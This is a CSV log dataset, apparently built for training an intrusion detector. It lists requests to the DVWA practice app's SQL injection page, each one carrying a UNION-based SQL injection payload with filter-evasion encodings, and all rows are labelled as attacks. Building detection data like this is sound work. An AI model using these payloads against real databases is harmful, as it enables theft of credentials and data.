ip,timestamp,method,url,path,query,protocol,status,size,response_time,referer,user_agent,decoded_url,decoded_query,body,decoded_body,content_type,is_json_payload,json_depth,param_count_body,attack_type,existing_label,label,label_source,request_hash
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=-1'+UNION+ALL+SELECT+1,version()+;--+-",/vulnerabilities/sqli/,"id=-1'+UNION+ALL+SELECT+1,version()+;--+-",HTTP/1.1,200,2439,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=-1' UNION ALL SELECT 1,version() ;-- -","id=-1' UNION ALL SELECT 1,version() ;-- -",,,,0,0,0,sqli_union,1,1,existing_log_label,d4c0f10354f2db321674a3ac93719870
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D%27%2BUNION%2BSELECT%2Btable_name%2Ctable_schema%2B--%2B-,/vulnerabilities/sqli/,id%3D%27%2BUNION%2BSELECT%2Btable_name%2Ctable_schema%2B--%2B-,HTTP/1.1,200,2028,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id='+UNION+SELECT+table_name,table_schema+--+-","id='+UNION+SELECT+table_name,table_schema+--+-",,,,0,0,0,sqli_union,1,1,existing_log_label,64efe990066a483bc90c657308b498f4
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D%2527%2B%2BUnion%2B%2BSelect%2B%2Bcolumn_name%252Cnull%252C%2B%2Btable_name%2B%2BFrom%2B%2Binformation_schema.tables%2B%2B--&Submit=Submit,/vulnerabilities/sqli/,id=id%253D%2527%2B%2BUnion%2B%2BSelect%2B%2Bcolumn_name%252Cnull%252C%2B%2Btable_name%2B%2BFrom%2B%2Binformation_schema.tables%2B%2B--&Submit=Submit,HTTP/1.1,200,3279,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D%27++Union++Select++column_name%2Cnull%2C++table_name++From++information_schema.tables++--&Submit=Submit,id=id%3D%27++Union++Select++column_name%2Cnull%2C++table_name++From++information_schema.tables++--&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,27d8ac4f18c8122bf39b3a89f0d151fe
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2Bunion%2BALL%2Bselect%2Bnull%252C%2B1%252C2%2BfROm%2Bdvwa.users%2B%253B--%2B-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2Bunion%2BALL%2Bselect%2Bnull%252C%2B1%252C2%2BfROm%2Bdvwa.users%2B%253B--%2B-&Submit=Submit,HTTP/1.1,200,4476,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D1%27+union+ALL+select+null%2C+1%2C2+fROm+dvwa.users+%3B--+-&Submit=Submit,id=id%3D1%27+union+ALL+select+null%2C+1%2C2+fROm+dvwa.users+%3B--+-&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,233f275183f92da57e96d5b56b005d01
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D%2527%252F%252A%252A%252FUnion%252F%252A%252A%252FSelect%252F%252A%252A%252Fcolumn_name%252Cnull%252C%252F%252A%252A%252Ftable_name%252F%252A%252A%252FfRom%252F%252A%252A%252Finformation_schema.tables%252F%252A%252A%252F--&Submit=Submit,/vulnerabilities/sqli/,id=id%253D%2527%252F%252A%252A%252FUnion%252F%252A%252A%252FSelect%252F%252A%252A%252Fcolumn_name%252Cnull%252C%252F%252A%252A%252Ftable_name%252F%252A%252A%252FfRom%252F%252A%252A%252Finformation_schema.tables%252F%252A%252A%252F--&Submit=Submit,HTTP/1.1,200,4189,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=id%3D%27%2F%2A%2A%2FUnion%2F%2A%2A%2FSelect%2F%2A%2A%2Fcolumn_name%2Cnull%2C%2F%2A%2A%2Ftable_name%2F%2A%2A%2FfRom%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F--&Submit=Submit,id=id%3D%27%2F%2A%2A%2FUnion%2F%2A%2A%2FSelect%2F%2A%2A%2Fcolumn_name%2Cnull%2C%2F%2A%2A%2Ftable_name%2F%2A%2A%2FfRom%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F--&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,de2de11bfe9325389b7214593bfabe9c
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27 UNION+SELECT+user(),+database(),+version() %23",/vulnerabilities/sqli/,"id%3D1%27 UNION+SELECT+user(),+database(),+version() %23",HTTP/1.1,200,2244,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1' UNION SELECT user(), database(), version() #","id=1' UNION SELECT user(), database(), version() #",,,,0,0,0,sqli_union,1,1,existing_log_label,d0bb7353e44d51cbfa173550a3c62663
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D-1%27%2F%2A%2A%2FUnion%2F%2A%2A%2FALL%2F%2A%2A%2FSElecT%2F%2A%2A%2Fuser%2Cpassword%2F%2A%2A%2F%2F%2A,/vulnerabilities/sqli/,id%3D-1%27%2F%2A%2A%2FUnion%2F%2A%2A%2FALL%2F%2A%2A%2FSElecT%2F%2A%2A%2Fuser%2Cpassword%2F%2A%2A%2F%2F%2A,HTTP/1.1,200,2141,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=-1'/**/Union/**/ALL/**/SElecT/**/user,password/**//*","id=-1'/**/Union/**/ALL/**/SElecT/**/user,password/**//*",,,,0,0,0,sqli_union,1,1,existing_log_label,dcdc565deec684ee6b66c084fb1517f9
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2B%2Bunion%2B%2BSELECT%2B%2Buser%2528%2529%252C%2B%2Bdatabase%2528%2529%252C%2B%2Bversion%2528%2529%2B%2B%253B--%2B%2B-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2B%2Bunion%2B%2BSELECT%2B%2Buser%2528%2529%252C%2B%2Bdatabase%2528%2529%252C%2B%2Bversion%2528%2529%2B%2B%253B--%2B%2B-&Submit=Submit,HTTP/1.1,200,2597,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D1%27++union++SELECT++user%28%29%2C++database%28%29%2C++version%28%29++%3B--++-&Submit=Submit,id=id%3D1%27++union++SELECT++user%28%29%2C++database%28%29%2C++version%28%29++%3B--++-&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,5c7a0e8d37645ce814445a54ee99d8b1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'+UNION SELECT+user(),+database(),+version() %2F%2A",/vulnerabilities/sqli/,"id=1'+UNION SELECT+user(),+database(),+version() %2F%2A",HTTP/1.1,200,4131,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1' UNION SELECT user(), database(), version() /*","id=1' UNION SELECT user(), database(), version() /*",,,,0,0,0,sqli_union,1,1,existing_log_label,f13b240eb0315b3ebad950f84fa8cfbb
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=-1' UNION ALL SELECT 1,version() %23",/vulnerabilities/sqli/,"id=-1' UNION ALL SELECT 1,version() %23",HTTP/1.1,200,4361,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=-1' UNION ALL SELECT 1,version() #","id=-1' UNION ALL SELECT 1,version() #",,,,0,0,0,sqli_union,1,1,existing_log_label,d54ece44c1612f2cb038980b9fb495f1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,HTTP/1.1,200,1032,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/,,"id=-1'/**/UNION/**/ALL/**/SELECT/**/1,2/**//*","id=-1'/**/UNION/**/ALL/**/SELECT/**/1,2/**//*",application/x-www-form-urlencoded,0,0,1,sqli_union,1,1,existing_log_label,19a539d1a0ec6c62377e6d789b25c8c3
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D%27%2520UniON%2520SelEct%2520column_name%2Cnull%2520%2523,/vulnerabilities/sqli/,id%3D%27%2520UniON%2520SelEct%2520column_name%2Cnull%2520%2523,HTTP/1.1,200,4431,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id='%20UniON%20SelEct%20column_name,null%20%23","id='%20UniON%20SelEct%20column_name,null%20%23",,,,0,0,0,sqli_union,1,1,existing_log_label,502b473b6ae2bc53560cc817995885e2
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'%20union%20ALL%20Select%20null,%20table_name,table_schema%20From%20users%20#",/vulnerabilities/sqli/,"id=1'%20union%20ALL%20Select%20null,%20table_name,table_schema%20From%20users%20",HTTP/1.1,200,1766,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1' union ALL Select null, table_name,table_schema From users #","id=1' union ALL Select null, table_name,table_schema From users ",,,,0,0,0,sqli_union,1,1,existing_log_label,7ba6db27194dfaee09102d322d0656e6
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1' UNION SELECT user(), database(), version() -- -",/vulnerabilities/sqli/,"id=1' UNION SELECT user(), database(), version() -- -",HTTP/1.1,200,2378,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1' UNION SELECT user(), database(), version() -- -","id=1' UNION SELECT user(), database(), version() -- -",,,,0,0,0,sqli_union,1,1,existing_log_label,b38fd8476cc01c70d3cd03e5c1295ef3
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'++union SELECt++table_name,table_schema++FROM+ information_schema.columns +%2F%2A",/vulnerabilities/sqli/,"id%3D1'++union SELECt++table_name,table_schema++FROM+ information_schema.columns +%2F%2A",HTTP/1.1,200,503,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1'  union SELECt  table_name,table_schema  FROM  information_schema.columns  /*","id=1'  union SELECt  table_name,table_schema  FROM  information_schema.columns  /*",,,,0,0,0,sqli_union,1,1,existing_log_label,a98cf84e36e40c4eb539cce806974aef
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,HTTP/1.1,200,1734,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/,,"id=' union SeLECt table_name,table_schema --","id=' union SeLECt table_name,table_schema --",application/x-www-form-urlencoded,0,0,1,sqli_union,1,1,existing_log_label,be8a8f315e1f105db74492908e2800ac
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,HTTP/1.1,200,4013,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/,,"id='+union+sELEct+table_name,table_schema+--","id=' union sELEct table_name,table_schema --",application/x-www-form-urlencoded,0,0,1,sqli_union,1,1,existing_log_label,8aa4d8ac24dfbab3724b04b9d785c3b8
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D%27+UNION+Select+1,version(),+table_name+From+information_schema.tables+;--+-",/vulnerabilities/sqli/,"id%3D%27+UNION+Select+1,version(),+table_name+From+information_schema.tables+;--+-",HTTP/1.1,200,3466,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=' UNION Select 1,version(), table_name From information_schema.tables ;-- -","id=' UNION Select 1,version(), table_name From information_schema.tables ;-- -",,,,0,0,0,sqli_union,1,1,existing_log_label,be7f1fc00bbf47385ac53764a7763657
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D%2527%252F%252A%252A%252FUNION%252F%252A%252A%252FSELECT%252F%252A%252A%252Ftable_name%252Ctable_schema%252C%252F%252A%252A%252Ftable_name%252F%252A%252A%252FFROM%252F%252A%252A%252Finformation_schema.tables%252F%252A%252A%252F--%252F%252A%252A%252F-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D%2527%252F%252A%252A%252FUNION%252F%252A%252A%252FSELECT%252F%252A%252A%252Ftable_name%252Ctable_schema%252C%252F%252A%252A%252Ftable_name%252F%252A%252A%252FFROM%252F%252A%252A%252Finformation_schema.tables%252F%252A%252A%252F--%252F%252A%252A%252F-&Submit=Submit,HTTP/1.1,200,2774,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ftable_name%2Ctable_schema%2C%2F%2A%2A%2Ftable_name%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F--%2F%2A%2A%2F-&Submit=Submit,id=id%3D%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ftable_name%2Ctable_schema%2C%2F%2A%2A%2Ftable_name%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F--%2F%2A%2A%2F-&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,d38be77b50633d9bd62fdf4ae0e57f18
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D%2527%2509UNION%2509SELECT%25091%252C2%252C%2509table_name%2509FROM%2509information_schema.tables%2509--%2509-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D%2527%2509UNION%2509SELECT%25091%252C2%252C%2509table_name%2509FROM%2509information_schema.tables%2509--%2509-&Submit=Submit,HTTP/1.1,200,1152,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D%27%09UNION%09SELECT%091%2C2%2C%09table_name%09FROM%09information_schema.tables%09--%09-&Submit=Submit,id=id%3D%27%09UNION%09SELECT%091%2C2%2C%09table_name%09FROM%09information_schema.tables%09--%09-&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,f71a78adadf69c59670999d3b3352db6
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D-1%2527%252BUNION%252BALL%252BSELECT%252Bcolumn_name%252Cnull%252B%252523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D-1%2527%252BUNION%252BALL%252BSELECT%252Bcolumn_name%252Cnull%252B%252523&Submit=Submit,HTTP/1.1,200,2752,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=id%3D-1%27%2BUNION%2BALL%2BSELECT%2Bcolumn_name%2Cnull%2B%2523&Submit=Submit,id=id%3D-1%27%2BUNION%2BALL%2BSELECT%2Bcolumn_name%2Cnull%2B%2523&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,d5efecf3b7f698c3e5e461e678e6276e
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252F%252A%252A%252Funion%252F%252A%252A%252FALL%252F%252A%252A%252Fselect%252F%252A%252A%252Fnull%252C%252F%252A%252A%252Fcolumn_name%252Cnull%252F%252A%252A%252Ffrom%252F%252A%252A%252Finformation_schema.tables%252F%252A%252A%252F%252F%252A&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252F%252A%252A%252Funion%252F%252A%252A%252FALL%252F%252A%252A%252Fselect%252F%252A%252A%252Fnull%252C%252F%252A%252A%252Fcolumn_name%252Cnull%252F%252A%252A%252Ffrom%252F%252A%252A%252Finformation_schema.tables%252F%252A%252A%252F%252F%252A&Submit=Submit,HTTP/1.1,200,1370,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D1%27%2F%2A%2A%2Funion%2F%2A%2A%2FALL%2F%2A%2A%2Fselect%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fcolumn_name%2Cnull%2F%2A%2A%2Ffrom%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F%2F%2A&Submit=Submit,id=id%3D1%27%2F%2A%2A%2Funion%2F%2A%2A%2FALL%2F%2A%2A%2Fselect%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fcolumn_name%2Cnull%2F%2A%2A%2Ffrom%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F%2F%2A&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,90c594ba48646dc01b3c3f0f9e35e6d0
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D-1%27%09union%09ALL%09Select%09column_name%2Cnull%09--%09-,/vulnerabilities/sqli/,id%3D-1%27%09union%09ALL%09Select%09column_name%2Cnull%09--%09-,HTTP/1.1,200,3905,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=-1'	union	ALL	Select	column_name,null	--	-","id=-1'	union	ALL	Select	column_name,null	--	-",,,,0,0,0,sqli_union,1,1,existing_log_label,7a7c8da26319e7310147e3069759fb4b
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D-1%27+unIoN+ALL+select+user%2Cpassword+--+-,/vulnerabilities/sqli/,id%3D-1%27+unIoN+ALL+select+user%2Cpassword+--+-,HTTP/1.1,200,3625,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=-1' unIoN ALL select user,password -- -","id=-1' unIoN ALL select user,password -- -",,,,0,0,0,sqli_union,1,1,existing_log_label,641b96ddfccfcce2d2c0f2d646ebc163
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1' union Select column_name,null+FROM dvwa.users --",/vulnerabilities/sqli/,"id%3D1' union Select column_name,null+FROM dvwa.users --",HTTP/1.1,200,1803,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1' union Select column_name,null FROM dvwa.users --","id=1' union Select column_name,null FROM dvwa.users --",,,,0,0,0,sqli_union,1,1,existing_log_label,13dce40a633a8d5a9ef1e749482f8c58
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D%2527%2BUNION%2BSELECT%2Buser%252Cpassword%2B--%2B-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D%2527%2BUNION%2BSELECT%2Buser%252Cpassword%2B--%2B-&Submit=Submit,HTTP/1.1,200,1839,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D%27+UNION+SELECT+user%2Cpassword+--+-&Submit=Submit,id=id%3D%27+UNION+SELECT+user%2Cpassword+--+-&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,bdeacdb4e94883f51d4e2f6805c298ae
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=' UNION SELECT column_name,null --",/vulnerabilities/sqli/,"id=' UNION SELECT column_name,null --",HTTP/1.1,200,3491,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=' UNION SELECT column_name,null --","id=' UNION SELECT column_name,null --",,,,0,0,0,sqli_union,1,1,existing_log_label,feaf21bcbf064deaffe816061729872f
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2BUNION%2BALL%2BSELECT%2Bnull%252C%2Btable_name%252Ctable_schema%2BFROM%2Binformation_schema.tables%2B%253B--%2B-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2BUNION%2BALL%2BSELECT%2Bnull%252C%2Btable_name%252Ctable_schema%2BFROM%2Binformation_schema.tables%2B%253B--%2B-&Submit=Submit,HTTP/1.1,200,2687,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D1%27+UNION+ALL+SELECT+null%2C+table_name%2Ctable_schema+FROM+information_schema.tables+%3B--+-&Submit=Submit,id=id%3D1%27+UNION+ALL+SELECT+null%2C+table_name%2Ctable_schema+FROM+information_schema.tables+%3B--+-&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,3e4f9f92b76bf9b7e2b3c98f97bd1e5b
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D%27+UNION+SELECT+column_name%2Cnull+%23,/vulnerabilities/sqli/,id%3D%27+UNION+SELECT+column_name%2Cnull+%23,HTTP/1.1,200,3243,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=' UNION SELECT column_name,null #","id=' UNION SELECT column_name,null #",,,,0,0,0,sqli_union,1,1,existing_log_label,51ef84431681cd7e7a206202426681ab
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+UNION+ALL+SELECT+null%2C+user%2Cpassword+FROM+information_schema.tables+%23,/vulnerabilities/sqli/,id%3D1%27+UNION+ALL+SELECT+null%2C+user%2Cpassword+FROM+information_schema.tables+%23,HTTP/1.1,200,610,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1' UNION ALL SELECT null, user,password FROM information_schema.tables #","id=1' UNION ALL SELECT null, user,password FROM information_schema.tables #",,,,0,0,0,sqli_union,1,1,existing_log_label,1de44ddfc73a68d4ab940a4d7830ebbe
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D%2527%252Bunion%252Bselect%252Bcolumn_name%252Cnull%252C%252Btable_name%252BFrom%252Binformation_schema.tables%252B%252F%252A&Submit=Submit,/vulnerabilities/sqli/,id=id%253D%2527%252Bunion%252Bselect%252Bcolumn_name%252Cnull%252C%252Btable_name%252BFrom%252Binformation_schema.tables%252B%252F%252A&Submit=Submit,HTTP/1.1,200,1229,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D%27%2Bunion%2Bselect%2Bcolumn_name%2Cnull%2C%2Btable_name%2BFrom%2Binformation_schema.tables%2B%2F%2A&Submit=Submit,id=id%3D%27%2Bunion%2Bselect%2Bcolumn_name%2Cnull%2C%2Btable_name%2BFrom%2Binformation_schema.tables%2B%2F%2A&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,7660c44a523655265ddb75e9043cf6db
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D%27+Union+sELecT+user%2Cpassword+--,/vulnerabilities/sqli/,id%3D%27+Union+sELecT+user%2Cpassword+--,HTTP/1.1,200,1892,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=' Union sELecT user,password --","id=' Union sELecT user,password --",,,,0,0,0,sqli_union,1,1,existing_log_label,478f1bfd15e1d1e545468157b2ab6a0f
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'%20UNION%20SELECT%201,version()%20FROM%20information_schema.tables%20;--%20-",/vulnerabilities/sqli/,"id=1'%20UNION%20SELECT%201,version()%20FROM%20information_schema.tables%20;--%20-",HTTP/1.1,200,3000,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1' UNION SELECT 1,version() FROM information_schema.tables ;-- -","id=1' UNION SELECT 1,version() FROM information_schema.tables ;-- -",,,,0,0,0,sqli_union,1,1,existing_log_label,2208ca1dc30bcaae2af11b90801b6f0d
